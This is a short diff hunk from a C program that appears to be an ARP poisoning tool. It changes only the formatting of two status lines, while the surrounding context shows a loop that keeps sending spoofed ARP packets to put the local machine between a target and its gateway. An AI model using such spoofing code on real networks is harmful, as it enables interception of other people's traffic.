@@ -283,8 +283,8 @@ int main(int argc, char ** argv) {
 	printf("Starting poisoning...\n\033[?25l");
 	int sent = 1;
 
-	printf("ARP - %s is at -> %02X:%02X:%02X:%02X:%02X:%02X [%s]\n", target_ip, local_mac[0], local_mac[1], local_mac[2], local_mac[3], local_mac[4], local_mac[5], gateway_ip);
-	printf("ARP - %s is at -> %02X:%02X:%02X:%02X:%02X:%02X [%s]\n\n", gateway_ip, local_mac[0], local_mac[1], local_mac[2], local_mac[3], local_mac[4], local_mac[5], target_ip);
+	printf("ARP - %15s is at -> %02X:%02X:%02X:%02X:%02X:%02X [%15s]\n", target_ip, local_mac[0], local_mac[1], local_mac[2], local_mac[3], local_mac[4], local_mac[5], gateway_ip);
+	printf("ARP - %15s is at -> %02X:%02X:%02X:%02X:%02X:%02X [%15s]\n\n", gateway_ip, local_mac[0], local_mac[1], local_mac[2], local_mac[3], local_mac[4], local_mac[5], target_ip);
 	
 	while(1) {
 		sendto(sockfd, arp_poison_target_packet, ARP_PING_LEN, 0, (struct sockaddr*)&device, sizeof(device));
